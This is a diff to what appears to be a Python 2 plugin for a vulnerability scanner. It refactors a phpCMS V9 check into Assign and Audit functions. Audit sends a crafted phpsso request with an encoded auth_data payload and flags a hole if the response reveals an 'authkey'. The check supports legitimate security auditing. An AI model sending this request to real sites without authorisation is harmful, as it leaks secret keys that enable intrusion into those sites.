@@ -15,13 +15,17 @@ opts = [
 	['url','http://testasp.vulnweb.com','target url']
 ]
 
-def Audit(services):
+def Assign(services):
 	if services.has_key('url') and services.has_key('cms') and services['cms']=='phpCMS':
 		if (services.has_key('cmsversion') and services['cmsversion'] == 'V9') or services.has_key('cmsversion')==False:
-			url = services['url'] + '/phpsso_server/index.php?m=phpsso&c=index&a=getapplist&auth_data=v=1&appid=1&data=e5c2VAMGUQZRAQkIUQQKVwFUAgICVgAIAldVBQFDDQVcV0MUQGkAQxVZZlMEGA9+DjZoK1AHRmUwBGcOXW5UDgQhJDxaeQVnGAdxVRcKQ'
-			rq = requests.get(url)
-			if rq.status_code == 200 and 'authkey' in rq.text:
-				security_hole(url)
+			return True
+	return False
+
+def Audit(services):
+	url = services['url'] + '/phpsso_server/index.php?m=phpsso&c=index&a=getapplist&auth_data=v=1&appid=1&data=e5c2VAMGUQZRAQkIUQQKVwFUAgICVgAIAldVBQFDDQVcV0MUQGkAQxVZZlMEGA9+DjZoK1AHRmUwBGcOXW5UDgQhJDxaeQVnGAdxVRcKQ'
+	rq = requests.get(url)
+	if rq.status_code == 200 and 'authkey' in rq.text:
+		security_hole(url)
 # ----------------------------------------------------------------------------------------------------
 #	untest yet
 # ----------------------------------------------------------------------------------------------------
